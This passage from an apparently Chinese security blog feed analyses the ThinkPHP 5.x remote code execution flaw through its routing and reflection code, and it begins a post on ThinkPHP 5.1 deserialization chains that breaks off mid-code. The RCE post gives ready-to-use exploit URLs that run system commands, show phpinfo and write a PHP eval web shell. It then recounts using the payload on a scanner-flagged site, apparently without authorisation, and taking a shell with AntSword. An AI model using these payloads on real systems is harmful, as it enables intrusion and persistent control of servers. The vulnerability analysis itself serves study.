class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pathinfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;pathinfo)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[Config::get(<span class="string">&#x27;var_pathinfo&#x27;</span>)])) &#123;</span><br><span class="line">              <span class="comment">// 判断URL里面是否有兼容模式参数</span></span><br><span class="line">              <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] = <span class="variable">$_GET</span>[Config::get(<span class="string">&#x27;var_pathinfo&#x27;</span>)];</span><br><span class="line">              <span class="keyword">unset</span>(<span class="variable">$_GET</span>[Config::get(<span class="string">&#x27;var_pathinfo&#x27;</span>)]);</span><br><span class="line">          &#125; <span class="keyword">elseif</span> (IS_CLI) &#123;</span><br><span class="line">              <span class="comment">// CLI模式下 index.php module/controller/action/params/...</span></span><br><span class="line">              <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] = <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">1</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">1</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 分析PATHINFO信息</span></span><br><span class="line">          <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>])) &#123;</span><br><span class="line">              <span class="keyword">foreach</span> (Config::get(<span class="string">&#x27;pathinfo_fetch&#x27;</span>) <span class="keyword">as</span> <span class="variable">$type</span>) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="variable">$type</span>])) &#123;</span><br><span class="line">                      <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] = (<span class="number">0</span> === strpos(<span class="variable">$_SERVER</span>[<span class="variable">$type</span>], <span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>])) ?</span><br><span class="line">                      substr(<span class="variable">$_SERVER</span>[<span class="variable">$type</span>], strlen(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>])) : <span class="variable">$_SERVER</span>[<span class="variable">$type</span>];</span><br><span class="line">                      <span class="keyword">break</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;pathinfo = <span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>]) ? <span class="string">&#x27;/&#x27;</span> : ltrim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pathinfo;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其中var_pathinfo参数即为系统默认参数，默认值为s，通过GET方法将获取到的var_pathinfo的值，即s=/模块/控制器/操作/[参数名/参数值…]的内容送到routeCheck()函数中$path参数进行路由检查处理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params"><span class="variable">$request</span>, <span class="keyword">array</span> <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$path</span> = <span class="variable">$request</span>-&gt;path();</span><br><span class="line">       ......</span><br><span class="line">           <span class="comment">// 路由检测（根据路由定义返回不同的URL调度）</span></span><br><span class="line">           <span class="variable">$result</span> = Route::check(<span class="variable">$request</span>, <span class="variable">$path</span>, <span class="variable">$depr</span>, <span class="variable">$config</span>[<span class="string">&#x27;url_domain_deploy&#x27;</span>]);</span><br><span class="line">           <span class="variable">$must</span> = !is_null(<span class="built_in">self</span>::<span class="variable">$routeMust</span>) ? <span class="built_in">self</span>::<span class="variable">$routeMust</span> : <span class="variable">$config</span>[<span class="string">&#x27;url_route_must&#x27;</span>];</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$must</span> &amp;&amp; <span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">               <span class="comment">// 路由无效</span></span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> RouteNotFoundException();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">           <span class="variable">$result</span> = Route::parseUrl(<span class="variable">$path</span>, <span class="variable">$depr</span>, <span class="variable">$config</span>[<span class="string">&#x27;controller_auto_search&#x27;</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>若路由寻不到对应操作，即返回<code>$result=false</code>，且开启了强制路由<code>$must</code>的情况下，就会抛出异常，并最终进入Route::parseUrl函数，进行<code>$path</code>解析，以上就进入了我们的漏洞触发点：</p><p>/thinkphp/library/think/Route.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$depr</span> = <span class="string">&#x27;/&#x27;</span>, <span class="variable">$autoSearch</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$bind</span>[<span class="string">&#x27;module&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$bind</span> = str_replace(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$depr</span>, <span class="built_in">self</span>::<span class="variable">$bind</span>[<span class="string">&#x27;module&#x27;</span>]);</span><br><span class="line">        <span class="comment">// 如果有模块/控制器绑定</span></span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$bind</span> . (<span class="string">&#x27;.&#x27;</span> != substr(<span class="variable">$bind</span>, <span class="number">-1</span>) ? <span class="variable">$depr</span> : <span class="string">&#x27;&#x27;</span>) . ltrim(<span class="variable">$url</span>, <span class="variable">$depr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$url</span>              = str_replace(<span class="variable">$depr</span>, <span class="string">&#x27;|&#x27;</span>, <span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$path</span>, <span class="variable">$var</span>) = <span class="built_in">self</span>::parseUrlPath(<span class="variable">$url</span>);</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>首先，在该函数中进行url解析，然后，进入到parseUrlPath函数，根据/对包含模块/控制器/操作的URL进行分割成数组然后返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrlPath</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// 分隔符替换 确保路由定义使用统一的分隔符</span></span><br><span class="line">       <span class="variable">$url</span> = str_replace(<span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$url</span>);</span><br><span class="line">       <span class="variable">$url</span> = trim(<span class="variable">$url</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">       <span class="variable">$var</span> = [];</span><br><span class="line">       <span class="keyword">if</span> (<span class="literal">false</span> !== strpos(<span class="variable">$url</span>, <span class="string">&#x27;?&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// [模块/控制器/操作?]参数1=值1&amp;参数2=值2...</span></span><br><span class="line">           <span class="variable">$info</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">           <span class="variable">$path</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$info</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">           parse_str(<span class="variable">$info</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$var</span>);</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$url</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// [模块/控制器/操作]</span></span><br><span class="line">           <span class="variable">$path</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$url</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$path</span> = [<span class="variable">$url</span>];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> [<span class="variable">$path</span>, <span class="variable">$var</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>最终在parseUrl()函数中，将返回的<code>$path</code>提取出路由，即module、controller、action，然后封装到<code>$route</code>后返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$route</span> = [<span class="variable">$module</span>, <span class="variable">$controller</span>, <span class="variable">$action</span>];</span><br><span class="line">        <span class="comment">// 检查地址是否被定义过路由</span></span><br><span class="line">        <span class="variable">$name</span>  = strtolower(<span class="variable">$module</span> . <span class="string">&#x27;/&#x27;</span> . Loader::parseName(<span class="variable">$controller</span>, <span class="number">1</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$action</span>);</span><br><span class="line">        <span class="variable">$name2</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$module</span>) || <span class="keyword">isset</span>(<span class="variable">$bind</span>) &amp;&amp; <span class="variable">$module</span> == <span class="variable">$bind</span>) &#123;</span><br><span class="line">            <span class="variable">$name2</span> = strtolower(Loader::parseName(<span class="variable">$controller</span>, <span class="number">1</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$action</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$rules</span>[<span class="string">&#x27;name&#x27;</span>][<span class="variable">$name</span>]) || <span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$rules</span>[<span class="string">&#x27;name&#x27;</span>][<span class="variable">$name2</span>])) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;invalid request:&#x27;</span> . str_replace(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$depr</span>, <span class="variable">$url</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;module&#x27;</span>, <span class="string">&#x27;module&#x27;</span> =&gt; <span class="variable">$route</span>];</span><br></pre></td></tr></table></figure><p>回到thinkphp/library/think/App.php文件的run()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$dispatch</span>)) &#123;</span><br><span class="line">               <span class="variable">$dispatch</span> = <span class="built_in">self</span>::routeCheck(<span class="variable">$request</span>, <span class="variable">$config</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">// 记录当前调度信息</span></span><br><span class="line">           <span class="variable">$request</span>-&gt;dispatch(<span class="variable">$dispatch</span>);</span><br><span class="line">           <span class="comment">// 记录路由和请求信息</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$debug</span>) &#123;</span><br><span class="line">               Log::record(<span class="string">&#x27;[ ROUTE ] &#x27;</span> . var_export(<span class="variable">$dispatch</span>, <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">               Log::record(<span class="string">&#x27;[ HEADER ] &#x27;</span> . var_export(<span class="variable">$request</span>-&gt;header(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">               Log::record(<span class="string">&#x27;[ PARAM ] &#x27;</span> . var_export(<span class="variable">$request</span>-&gt;param(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">// 监听 app_begin</span></span><br><span class="line">           Hook::listen(<span class="string">&#x27;app_begin&#x27;</span>, <span class="variable">$dispatch</span>);</span><br><span class="line">           <span class="comment">// 请求缓存检查</span></span><br><span class="line">           <span class="variable">$request</span>-&gt;cache(</span><br><span class="line">               <span class="variable">$config</span>[<span class="string">&#x27;request_cache&#x27;</span>],</span><br><span class="line">               <span class="variable">$config</span>[<span class="string">&#x27;request_cache_expire&#x27;</span>],</span><br><span class="line">               <span class="variable">$config</span>[<span class="string">&#x27;request_cache_except&#x27;</span>]</span><br><span class="line">           );</span><br><span class="line">           <span class="variable">$data</span> = <span class="built_in">self</span>::exec(<span class="variable">$dispatch</span>, <span class="variable">$config</span>);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>在完成RouteCheck后，进入到exec()函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$dispatch</span>, <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">switch</span> (<span class="variable">$dispatch</span>[<span class="string">&#x27;type&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;redirect&#x27;</span>: <span class="comment">// 重定向跳转</span></span><br><span class="line">              <span class="variable">$data</span> = Response::create(<span class="variable">$dispatch</span>[<span class="string">&#x27;url&#x27;</span>], <span class="string">&#x27;redirect&#x27;</span>)</span><br><span class="line">                  -&gt;code(<span class="variable">$dispatch</span>[<span class="string">&#x27;status&#x27;</span>]);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;module&#x27;</span>: <span class="comment">// 模块/控制器/操作</span></span><br><span class="line">              <span class="variable">$data</span> = <span class="built_in">self</span>::module(</span><br><span class="line">                  <span class="variable">$dispatch</span>[<span class="string">&#x27;module&#x27;</span>],</span><br><span class="line">                  <span class="variable">$config</span>,</span><br><span class="line">                  <span class="keyword">isset</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>]) ? <span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>] : <span class="literal">null</span></span><br><span class="line">              );</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">      .........................  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在该函数中，首先路由信息首先进入module()函数进行检验，该函数首先查看该路由中的模块信息是否存在且是否存在于禁止的模块类表中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span>(<span class="params"><span class="variable">$result</span>, <span class="variable">$config</span>, <span class="variable">$convert</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="variable">$result</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$request</span> = Request::instance();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$config</span>[<span class="string">&#x27;app_multi_module&#x27;</span>]) &#123;</span><br><span class="line">        <span class="comment">// 多模块部署</span></span><br><span class="line">        <span class="variable">$module</span> = strip_tags(strtolower(<span class="variable">$result</span>[<span class="number">0</span>] ?: <span class="variable">$config</span>[<span class="string">&#x27;default_module&#x27;</span>]));</span><br><span class="line">        <span class="variable">$bind</span> = Route::getBind(<span class="string">&#x27;module&#x27;</span>);</span><br><span class="line">        <span class="variable">$available</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$bind</span>) &#123;</span><br><span class="line">            <span class="comment">// 绑定模块</span></span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$bindModule</span>) = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$bind</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$result</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">                <span class="variable">$module</span> = <span class="variable">$bindModule</span>;</span><br><span class="line">                <span class="variable">$available</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$module</span> == <span class="variable">$bindModule</span>) &#123;</span><br><span class="line">                <span class="variable">$available</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">      .......</span><br></pre></td></tr></table></figure><p>模块存在的话，继续往下跟踪，分别将模块中的controller、actionName经过处理后赋值到<code>$instance</code>、<code>$action</code>，最终<code>$instance</code>、<code>$action</code>被赋值给了<code>$call</code>参数。最终$call参数进入了self::invokeMethod()进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeMethod</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$vars</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="variable">$class</span> = is_object(<span class="variable">$method</span>[<span class="number">0</span>]) ? <span class="variable">$method</span>[<span class="number">0</span>] : <span class="built_in">self</span>::invokeClass(<span class="variable">$method</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> \ReflectionMethod(<span class="variable">$class</span>, <span class="variable">$method</span>[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 静态方法</span></span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> \ReflectionMethod(<span class="variable">$method</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$args</span> = <span class="built_in">self</span>::bindParams(<span class="variable">$reflect</span>, <span class="variable">$vars</span>);</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$debug</span> &amp;&amp; Log::record(<span class="string">&#x27;[ RUN ] &#x27;</span> . <span class="variable">$reflect</span>-&gt;class . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$reflect</span>-&gt;name . <span class="string">&#x27;[ &#x27;</span> . <span class="variable">$reflect</span>-&gt;getFileName() . <span class="string">&#x27; ]&#x27;</span>, <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$reflect</span>-&gt;invokeArgs(<span class="keyword">isset</span>(<span class="variable">$class</span>) ? <span class="variable">$class</span> : <span class="literal">null</span>, <span class="variable">$args</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数中，通过反射ReflectionMethod获取controller(method[0])和action(method[1])对象下的方法，然后通过<code>$args </code>= self::bindParams(<code>$reflect</code>, <code>$vars</code>);获取到传入参数（也就是Payload）。</p><p>最后在调用反射<code>$reflect</code>-&gt;invokeArgs($args);，将Payload数组传入反射对象函数invokeFunction，通过构造好的参数，可执行任意代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeFunction</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$vars</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> \ReflectionFunction(<span class="variable">$function</span>);</span><br><span class="line">        <span class="variable">$args</span> = <span class="built_in">self</span>::bindParams(<span class="variable">$reflect</span>, <span class="variable">$vars</span>);</span><br><span class="line">        <span class="comment">// 记录执行信息</span></span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$debug</span> &amp;&amp; Log::record(<span class="string">&#x27;[ RUN ] &#x27;</span> . <span class="variable">$reflect</span>-&gt;__toString(), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$reflect</span>-&gt;invokeArgs(<span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>docker环境：<a href="https://vulhub.org/#/environments/thinkphp/5-rce/">Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability</a></p><ol><li><p>利用 system 函数远程命令执行</p><p><code>http://121.40.95.148:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913233136968.png" alt="image-20210913233136968"></p></li><li><p>通过phpinfo()函数显示PHP信息</p><p><code>http://121.40.95.148:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913233326906.png" alt="image-20210913233326906"></p></li><li><p>写入shell</p><p><code>http://121.40.95.148:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=./test.php&amp;vars[1][]=&lt;?php @eval($_POST[cmd]);?&gt;</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913234200819.png" alt="image-20210913234200819"></p></li></ol><h1 id="实战应用"><a href="#实战应用" class="headerlink" title="实战应用"></a>实战应用</h1><p>通过漏扫工具检测到某站点可能存在<code>poc-yaml-thinkphp5-controller-rce</code></p><p>直接上payload，可查看phpinfo</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913205818270.png" alt="image-20210913205818270"></p><p>但执行不了系统命令，禁止了system()、assert()等函数</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913205950246.png" alt="image-20210913205950246"></p><p>尝试写入shell，成功！</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913210422113.png" alt="image-20210913210422113"></p><p>顺势蚁剑连接，getshell成功！</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913210704307.png" alt="image-20210913210704307"></p><p>第一个高危漏洞拿下！</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210913211441980.png" alt="image-20210913211441980"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://www.secpulse.com/archives/93903.html">https://www.secpulse.com/archives/93903.html</a></p><p><a href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a></p><p><a href="https://drunkmars.top/2021/04/14/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E6%80%BB%E7%BB%93/">https://drunkmars.top/2021/04/14/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E6%80%BB%E7%BB%93/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHPv5.1反序列链分析</title>
      <link href="posts/32358.html"/>
      <url>posts/32358.html</url>
      
        <content type="html"><![CDATA[<h1 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h1><p>先来回顾下反序列化中常用到的几个魔法函数</p><ul><li>__construct()：创建对象时会自动调用</li><li>__destruct()：对象销毁时自动调用</li><li>__sleep()：执行serialize()时自动调用</li><li>__wake()：执行unserialize()时自动调用</li><li>__toString()：对象被作为字符串处理时自动调用</li><li>__get()：从不可访问的属性中读取数据时自动调用</li><li>__call()：调用类中不存在的或不可访问的方法时自动调用</li></ul><h1 id="反序列化链分析"><a href="#反序列化链分析" class="headerlink" title="反序列化链分析"></a>反序列化链分析</h1><p>寻找入口点，全局搜索<code>__destruct()</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210905144702142.png" alt="image-20210905144702142"></p><p>前三处都是执行<code>$this-&gt;stop();</code>，关闭连接，无法利用</p><p>第四个是think/process/pipes下Windows类的<code>__destruct()</code> ，除了stop()方法，还有一个removeFiles()方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全文追踪此函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span 